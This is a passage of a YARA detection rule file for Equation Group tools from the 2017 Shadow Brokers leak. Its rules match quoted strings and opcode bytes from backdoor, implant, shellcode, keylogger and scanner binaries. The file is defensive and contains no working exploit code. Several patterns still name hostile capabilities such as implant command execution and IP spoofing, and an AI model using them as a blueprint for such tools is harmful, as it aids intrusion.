      hash2 = "b99c3cc1acbb085c9a895a8c3510f6daaf31f0d2d9ccb8477c7fb7119376f57b"
      hash3 = "92c6a9e648bfd98bbceea3813ce96c6861487826d6b2c3d462debae73ed25b34"
      id = "40066023-ede9-5669-8b4d-a26a693d8818"
   strings:
      $x1 = "[+] Backdoor shellcode written" fullword ascii
      $x2 = "[*] Attempting exploit method %d" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 600KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17__Emphasismine {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      super_rule = 1
      hash1 = "dcaf91bd4af7cc7d1fb24b5292be4e99c7adf4147892f6b3b909d1d84dd4e45b"
      hash2 = "348eb0a6592fcf9da816f4f7fc134bcae1b61c880d7574f4e19398c4ea467f26"
      id = "cc684f39-4971-52e0-b5ec-d28c7ce7032b"
   strings:
      $x1 = "Error: Could not calloc() for shellcode buffer" fullword ascii
      $x2 = "shellcodeSize: 0x%04X + 0x%04X + 0x%04X = 0x%04X" fullword ascii
      $x3 = "Generating shellcode" fullword ascii
      $x4 = "([0-9a-zA-Z]+) OK LOGOUT completed" fullword ascii
      $x5 = "Error: Domino is not the expected version. (%s, %s)" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Eternalromance {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      super_rule = 1
      hash1 = "f1ae9fdbb660aae3421fd3e5b626c1e537d8e9ee2f9cd6d56cb70b6878eaca5d"
      hash2 = "b99c3cc1acbb085c9a895a8c3510f6daaf31f0d2d9ccb8477c7fb7119376f57b"
      id = "40066023-ede9-5669-8b4d-a26a693d8818"
   strings:
      $x1 = "[-] Error: Exploit choice not supported for target OS!!" fullword ascii
      $x2 = "Error: Target machine out of NPP memory (VERY BAD!!) - Backdoor removed" fullword ascii
      $x3 = "[-] Error: Backdoor not present on target" fullword ascii
      $x4 = "***********    TARGET ARCHITECTURE IS X64    ************" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them ) or 2 of them
}

rule EquationGroup_Toolset_Apr17_Gen4 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      super_rule = 1
      hash1 = "fe7ce2fdb245c62e4183c728bc97e966a98fdc8ffd795ed09da23f96e85dcdcd"
      hash2 = "0989bfe351342a7a1150b676b5fd5cbdbc201b66abcb23137b1c4de77a8f61a6"
      hash3 = "270850303e662be53d90fa60a9e5f4bd2bfb95f92a046c77278257631d9addf4"
      hash4 = "7a086c0acb6df1fa304c20733f96e898d21ca787661270f919329fadfb930a6e"
      hash5 = "c236e0d9c5764f223bd3d99f55bd36528dfc0415e14f5fde1e5cdcada14f4ec0"
      hash6 = "9d98e044eedc7272823ba8ed80dff372fde7f3d1bece4e5affb21e16f7381eb2"
      hash7 = "dfce29df4d198c669a87366dd56a7426192481d794f71cd5bb525b08132ed4f7"
      hash8 = "87fdc6c32b9aa8ae97c7efbbd5c9ae8ec5595079fc1488f433beef658efcb4e9"
      hash9 = "722f034ba634f45c429c7dafdbff413c08976b069a6b30ec91bfa5ce2e4cda26"
      hash10 = "d94b99908f528fa4deb56b11eac29f6a6e244a7b3aac36b11b807f2f74c6d8be"
      hash11 = "4b07d9d964b2c0231c1db7526237631bb83d0db80b3c9574cc414463703462d3"
      hash12 = "30b63abde1e871c90df05137ec08df3fa73dedbdb39cb4bd2a2df4ca65bc4e53"
      hash13 = "02c1b08224b7ad4ac3a5b7b8e3268802ee61c1ec30e93e392fa597ae3acc45f7"
      hash14 = "690f09859ddc6cd933c56b9597f76e18b62a633f64193a51f76f52f67bc2f7f0"
      id = "f935c942-02a4-59b3-89ce-e5e3fa1cacda"
   strings:
      $x1 = "[+] \"TargetPort\"      %hu" fullword ascii
      $x2 = "---<<<  Complete  >>>---" fullword ascii
      $x3 = "[+] \"NetworkTimeout\"  %hu" fullword ascii

      $op1 = { 46 83 c4 0c 83 fe 0c 0f 8c 5e ff ff ff b8 }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 150KB and ( 1 of ($x*) or 2 of them ) )
}

rule EquationGroup_Toolset_Apr17_Gen1 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      super_rule = 1
      hash1 = "1b5b33931eb29733a42d18d8ee85b5cd7d53e81892ff3e60e2e97f3d0b184d31"
      hash2 = "139697168e4f0a2cc73105205c0ddc90c357df38d93dbade761392184df680c7"
      id = "98b0a398-7761-5506-bd2f-117c118df11f"
   strings:
      $x1 = "Restart with the new protocol, address, and port as target." fullword ascii
      $x2 = "TargetPort      : %s (%u)" fullword ascii
      $x3 = "Error: strchr() could not find '@' in account name." fullword ascii
      $x4 = "TargetAcctPwd   : %s" fullword ascii
      $x5 = "Creating CURL connection handle..." fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 80KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Gen2 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      super_rule = 1
      hash1 = "7fe425cd040608132d4f4ab2671e04b340a102a20c97ffdcf1b75be43a9369b5"
      hash2 = "561c0d4fc6e0ff0a78613d238c96aed4226fbb7bb9ceea1d19bc770207a6be1e"
      hash3 = "f2e90e04ddd05fa5f9b2fec024cd07365aebc098593d636038ebc2720700662b"
      hash4 = "8f7e10a8eedea37ee3222c447410fd5b949bd352d72ef22ef0b2821d9df2f5ba"
      id = "e47de7dd-8a37-5d0d-9af2-2a30fa000b05"
   strings:
      $s1 = "[+] Setting password : (NULL)" fullword ascii
      $s2 = "[-] TbBuffCpy() failed!" fullword ascii
      $s3 = "[+] SMB negotiation" fullword ascii
      $s4 = "12345678-1234-ABCD-EF00-0123456789AB" fullword ascii
      $s5 = "Value must end with 0000 (2 NULLs)" fullword ascii
      $s6 = "[*] Configuring Payload" fullword ascii
      $s7 = "[*] Connecting to listener" fullword ascii

      $op1 = { b0 42 40 00 89 44 24 30 c7 44 24 34 }
      $op2 = { eb 59 8b 4c 24 10 68 1c 46 }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 80KB and 1 of ($s*) and 1 of ($op*) ) or 3 of them
}

rule EquationGroup_Toolset_Apr17_Gen3 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      super_rule = 1
      hash1 = "270850303e662be53d90fa60a9e5f4bd2bfb95f92a046c77278257631d9addf4"
      hash2 = "7a086c0acb6df1fa304c20733f96e898d21ca787661270f919329fadfb930a6e"
      hash3 = "c236e0d9c5764f223bd3d99f55bd36528dfc0415e14f5fde1e5cdcada14f4ec0"
      hash4 = "9d98e044eedc7272823ba8ed80dff372fde7f3d1bece4e5affb21e16f7381eb2"
      hash5 = "dfce29df4d198c669a87366dd56a7426192481d794f71cd5bb525b08132ed4f7"
      hash6 = "87fdc6c32b9aa8ae97c7efbbd5c9ae8ec5595079fc1488f433beef658efcb4e9"
      hash7 = "722f034ba634f45c429c7dafdbff413c08976b069a6b30ec91bfa5ce2e4cda26"
      hash8 = "d94b99908f528fa4deb56b11eac29f6a6e244a7b3aac36b11b807f2f74c6d8be"
      hash9 = "4b07d9d964b2c0231c1db7526237631bb83d0db80b3c9574cc414463703462d3"
      hash10 = "30b63abde1e871c90df05137ec08df3fa73dedbdb39cb4bd2a2df4ca65bc4e53"
      hash11 = "02c1b08224b7ad4ac3a5b7b8e3268802ee61c1ec30e93e392fa597ae3acc45f7"
      hash12 = "690f09859ddc6cd933c56b9597f76e18b62a633f64193a51f76f52f67bc2f7f0"
      id = "7951fac1-9d5f-5991-a19a-88f3c8402e39"
   strings:
      $s1 = "Logon failed.  Kerberos ticket not yet valid (target and KDC times not synchronized)" fullword ascii
      $s2 = "[-] Could not set \"CredentialType\"" fullword ascii

      $op1 = { 46 83 c4 0c 83 fe 0c 0f 8c 5e ff ff ff b8 }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 150KB and 2 of them )
}

/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-04-15
   Identifier: Equation Group Tools - Resource Folder
   Reference: https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation
*/

/* Rule Set ----------------------------------------------------------------- */

rule EquationGroup_Toolset_Apr17_yak {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "66ff332f84690642f4e05891a15bf0c9783be2a64edb2ef2d04c9205b47deb19"
      id = "e5562d1a-7980-5fb8-b098-2e26003fb159"
   strings:
      $x1 = "-xd = dump archive data & store in scancodes.txt" fullword ascii
      $x2 = "-------- driver start token -------" fullword wide
      $x3 = "-------- keystart token -------" fullword wide
      $x4 = "-xta = same as -xt but show special chars & store in keys_all.txt" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 800KB and 2 of them )
}

rule EquationGroup_Toolset_Apr17_AdUser_Implant {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "fd2efb226969bc82e2e38769a10a8a751138db69f4594a8de4b3c0522d4d885f"
      id = "4ba152c8-aa81-5558-8ad3-c62aa3231dab"
   strings:
      $s1 = ".?AVFeFinallyFailure@@" fullword ascii
      $s2 = "(&(objectCategory=person)(objectClass=user)(cn=" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 40KB and all of them )
}

rule EquationGroup_Toolset_Apr17_RemoteExecute_Implant {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "770663c07c519677316934cf482e500a73540d9933342c425f3e56258e6e6d8b"
      id = "5fa5ff71-42fa-58e2-a826-341fb73ea08a"
   strings:
      $op1 = { 53 00 63 00 68 00 65 00 64 00 75 00 6C 00 65 00
               00 00 00 00 53 00 65 00 72 00 76 00 69 00 63 00
               65 00 73 00 41 00 63 00 74 00 69 00 76 00 65 00
               00 00 00 00 FF FF FF FF 00 00 00 00 B0 17 00 68
               5C 00 70 00 69 00 70 00 65 00 5C 00 53 00 65 00
               63 00 6F 00 6E 00 64 00 61 00 72 00 79 00 4C 00
               6F 00 67 00 6F 00 6E 00 00 00 00 00 5C 00 00 00
               57 00 69 00 6E 00 53 00 74 00 61 00 30 00 5C 00
               44 00 65 00 66 00 61 00 75 00 6C 00 74 00 00 00
               6E 00 63 00 61 00 63 00 6E 00 5F 00 6E 00 70 00
               00 00 00 00 5C 00 70 00 69 00 70 00 65 00 5C 00
               53 00 45 00 43 00 4C 00 4F 00 47 00 4F 00 4E }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 40KB and all of them )
}

rule EquationGroup_Toolset_Apr17_Banner_Implant9x {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "5d69a8cfc9b636448f023fcf18d111f13a8e6bcb9a693eb96276e0d796ab4e0c"
      id = "7cbb509e-2a91-5e3c-8d19-61fda797cd8c"
   strings:
      $s1 = ".?AVFeFinallyFailure@@" fullword ascii

      $op1 = { c9 c3 57 8d 85 2c eb ff ff }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 20KB and all of them )
}

rule EquationGroup_Toolset_Apr17_greatdoc_dll_config {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "fd9d0abfa727784dd07562656967d220286fc0d63bcf7e2c35d4c02bc2e5fc2e"
      id = "592e4e40-f5cd-5a11-8a1b-0cdcf6f267ec"
   strings:
      $x1 = "C:\\Projects\\GREATERDOCTOR\\trunk\\GREATERDOCTOR" ascii
      $x2 = "src\\build\\Release\\dllConfig\\dllConfig.pdb" ascii
      $x3 = "GREATERDOCTOR [ commandline args configuration ]" fullword ascii
      $x4 = "-useage: <scanner> \"<cmdline args>\"" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_scanner {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "f180bdb247687ea9f1b58aded225d5c80a13327422cd1e0515ea891166372c53"
      id = "603c82d0-2e65-5353-a109-5f69697cffa4"
   strings:
      $x1 = "+daemon_version,system,processor,refid,clock" fullword ascii
      $x2 = "Usage: %s typeofscan IP_address" fullword ascii
      $x3 = "# scanning ip  %d.%d.%d.%d" fullword ascii
      $x4 = "Welcome to the network scanning tool" fullword ascii
      $x5 = "***** %s ***** (length %d)" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 90KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Mcl_NtMemory_Std {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "087db4f2dbf8e0679de421fec8fb2e6dd50625112eb232e4acc1408cc0bcd2d7"
      id = "608218a8-7642-5ec4-8c07-87248649f022"
   strings:
      $op1 = { 44 24 37 50 c6 44 24 38 72 c6 44 }
      $op2 = { 44 24 33 6f c6 44 24 34 77 c6 }
      $op3 = { 3b 65 c6 44 24 3c 73 c6 44 24 3d 73 c6 44 24 3e }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and all of them )
}

rule EquationGroup_Toolset_Apr17_tacothief {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "c71953cc84c27dc61df8f6f452c870a7880a204e9e21d9fd006a5c023b052b35"
      id = "7be7ca05-c2c7-5a7d-8b1b-e6741b4397b9"
   strings:
      $x1 = "File too large!  Must be less than 655360 bytes." fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and all of them )
}

rule EquationGroup_Toolset_Apr17_ntevt {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "4254ee5e688fc09bdc72bcc9c51b1524a2bb25a9fb841feaf03bc7ec1a9975bf"
      id = "fd25f703-ff3e-5e75-b1eb-24a658a1ac8e"
   strings:
      $x1 = "c:\\ntevt.pdb" fullword ascii

      $s1 = "ARASPVU" fullword ascii

      $op1 = { 41 5a 41 59 41 58 5f 5e 5d 5a 59 5b 58 48 83 c4 }
      $op2 = { f9 48 03 fa 48 33 c0 8a 01 49 03 c1 49 f7 e0 88 }
      $op3 = { 01 41 f6 e0 49 03 c1 88 01 48 33 }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 700KB and $x1 or 3 of them )
}

rule EquationGroup_Toolset_Apr17_Processes_Target {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "69cf7643dbecc5f9b4b29edfda6c0295bc782f0e438f19be8338426f30b4cc74"
      id = "1b910f46-5d19-5ecd-9647-10ee9ee7b012"
   strings:
      $s1 = "Select * from Win32_Process" fullword ascii
      $s3 = "\\\\%ls\\root\\cimv2" fullword wide
      $s5 = "%4ls%2ls%2ls%2ls%2ls%2ls.%11l[0-9]%1l[+-]%6s" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and 2 of them )
}

rule EquationGroup_Toolset_Apr17_st_lp {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "3b6f756cca096548dcad2b6c241c1dafd16806c060bec82a530f4d38755286a2"
      id = "2d4ee801-c7f4-5476-8368-89aa2863ba96"
   strings:
      $x1 = "Previous command: set injection processes (status=0x%x)" fullword ascii
      $x2 = "Secondary injection process is <null> [no secondary process will be used]" fullword ascii
      $x3 = "Enter the address to be used as the spoofed IP source address (xxx.xxx.xxx.xxx) -> " fullword ascii
      $x4 = "E: Execute a Command on the Implant" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 300KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_EpWrapper {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "a8eed17665ee22198670e22458eb8c9028ff77130788f24f44986cce6cebff8d"
      id = "81b72f7f-ba5a-5f45-b77c-071cfb4571d3"
   strings:
      $x1 = "* Failed to get remote TCP socket address" fullword wide
      $x2 = "* Failed to get 'LPStart' export" fullword wide
      $s5 = "Usage: %ls <logdir> <dll_search_path> <dll_to_load_path> <socket>" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 20KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_DiBa_Target_2000 {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "f9ea8ff5985b94f635d03f3aab9ad4fb4e8c2ad931137dba4f8ee8a809421b91"
      id = "c6ae85b6-0670-558c-9ce5-64bd5822f35b"
   strings:
      $s1 = "0M1U1Z1p1" fullword ascii

      $op1 = { f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 45 }
      $op2 = { 36 c6 45 e6 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 }
      $op3 = { c6 45 e8 65 c6 45 e9 70 c6 45 ea 74 c6 45 eb 5f }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and 3 of them )
}

rule EquationGroup_Toolset_Apr17_DllLoad_Target {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "a42d5201af655e43cefef30d7511697e6faa2469dc4a74bc10aa060b522a1cf5"
      id = "9def0814-c86a-5fae-abc2-4185596a74aa"
   strings:
      $s1 = "BzWKJD+" fullword ascii

      $op1 = { 44 24 6c 6c 88 5c 24 6d }
      $op2 = { 44 24 54 63 c6 44 24 55 74 c6 44 24 56 69 }
      $op3 = { 44 24 5c 6c c6 44 24 5d 65 c6 44 24 5e }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}

rule EquationGroup_Toolset_Apr17_EXPA {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "2017176d3b5731a188eca1b71c50fb938c19d6260c9ff58c7c9534e317d315f8"
      id = "106efe9b-f70f-51cf-bbb2-b9bf61df1dd1"
   strings:
      $x1 = "* The target is IIS 6.0 but is not running content indexing servicess," fullword ascii
      $x2 = "--ver 6 --sp <service_pack> --lang <language> --attack shellcode_option[s]sL" fullword ascii
      $x3 = "By default, the shellcode will attempt to immediately connect s$" fullword ascii
      $x4 = "UNEXPECTED SHELLCODE CONFIGURATION ERRORs" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_RemoteExecute_Target {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "4a649ca8da7b5499821a768c650a397216cdc95d826862bf30fcc4725ce8587f"
      id = "608e5244-2d3f-573c-a0de-44637051f4ba"
   strings:
      $s1 = "Win32_Process" fullword ascii
      $s2 = "\\\\%ls\\root\\cimv2" fullword wide

      $op1 = { 83 7b 18 01 75 12 83 63 }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}

rule EquationGroup_Toolset_Apr17_DS_ParseLogs {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "0228691d63038b072cdbf50782990d505507757efbfa87655bb2182cf6375956"
      id = "1906c0fc-3fbc-5995-8789-f1c02e574672"
   strings:
      $x1 = "* Size (%d) of remaining capture file is too small to contain a valid header" fullword wide
      $x2 = "* Capture header not found at start of buffer" fullword wide
      $x3 = "Usage: %ws <capture_file> <results_prefix>" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_Oracle_Implant {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "8e9be4960c62ed7f210ce08f291e410ce0929cd3a86fe70315d7222e3df4587e"
      id = "6ff4cd21-1060-5901-842e-c04bde4f16ec"
   strings:
      $op0 = { fe ff ff ff 48 89 9c 24 80 21 00 00 48 89 ac 24 }
      $op1 = { e9 34 11 00 00 b8 3e 01 00 00 e9 2a 11 00 00 b8 }
      $op2 = { 48 8b ca e8 bf 84 00 00 4c 8b e0 8d 34 00 44 8d }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 500KB and all of them )
}

rule EquationGroup_Toolset_Apr17_DmGz_Target {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "5964966041f93d5d0fb63ce4a85cf9f7a73845065e10519b0947d4a065fdbdf2"
      id = "182a2488-ac3f-5dc6-aa61-d6d267574d10"
   strings:
      $s1 = "\\\\.\\%ls" fullword ascii
      $s3 = "6\"6<6C6H6M6Z6f6t6" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 80KB and all of them )
}

rule EquationGroup_Toolset_Apr17_SetResourceName {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "537793d5158aecd0debae25416450bd885725adfc8ca53b0577a3df4b0222e2e"
      id = "dc261147-3b52-57c3-9729-2645a0999a99"
   strings:
      $x1 = "Updates the name of the dll or executable in the resource file" fullword ascii
      $x2 = "*NOTE: SetResourceName does not work with PeddleCheap versions" fullword ascii
      $x3 = "2 = [appinit.dll] level4 dll" fullword ascii
      $x4 = "1 = [spcss32.exe] level3 exe" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )
}

rule EquationGroup_Toolset_Apr17_drivers_Implant {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "ee8b048f1c6ba821d92c15d614c2d937c32aeda7b7ea0943fd4f640b57b1c1ab"
      id = "727a0a8c-0019-53e9-9632-c610299305fc"
   strings:
      $s1 = ".?AVFeFinallyFailure@@" fullword ascii
      $s2 = "hZwLoadDriver" fullword ascii

      $op1 = { b0 01 e8 58 04 00 00 c3 33 }
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30KB and all of them )
}

rule EquationGroup_Toolset_Apr17_Shares_Target {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "6c57fb33c5e7d2dee415ae6168c9c3e0decca41ffe023ff13056ff37609235cb"
      id = "51245be4-6d24-57e4-8c92-c8c1ae5e3cf9"
   strings:
      $s1 = "Select * from Win32_Share" fullword ascii
      $s2 = "slocalhost" fullword wide
      $s3 = "\\\\%ls\\root\\cimv2" fullword wide
      $s4 = "\\\\%ls\\%ls" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}

rule EquationGroup_Toolset_Apr17_ntfltmgr {
   meta:
      description = "Detects EquationGroup Tool - April Leak"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
      date = "2017-04-15"
      hash1 = "3df61b8ef42a995b8f15a0d38bc51f2f08f8d9a2afa1afc94c6f80671cf4a124"
      hash2 = "f7a886ee10ee6f9c6be48c20f370514be62a3fd2da828b0dff44ff3d485ff5c5"
      hash3 = "980954a2440122da5840b31af7e032e8a25b0ce43e071ceb023cca21cedb2c43"
      id = "402b14f5-4a7a-58fb-8f4a-0a29d6d34440"
   strings:
      $s3 = "wCw3wDwAw2wNw@wEwZw2wDwEwBwZwFwFw4w2wZw5w1w4wFwZwGwOwGwGwEw5w2wFwGwDwFwOw" fullword ascii
      $s6 = "w+w;w2w0w6w4w.w(wRw" fullword ascii

      $op1 = { 80 f7 ff ff 49 89 84 34 18 02 00 00 41 83 a4 34 }
      $op2 = { ff 15 0b 34 00 00 eb 92 }
      $op3 = { 4d 8d b4 34 08 02 00 00 4d 85 f6 0f 84 ae }
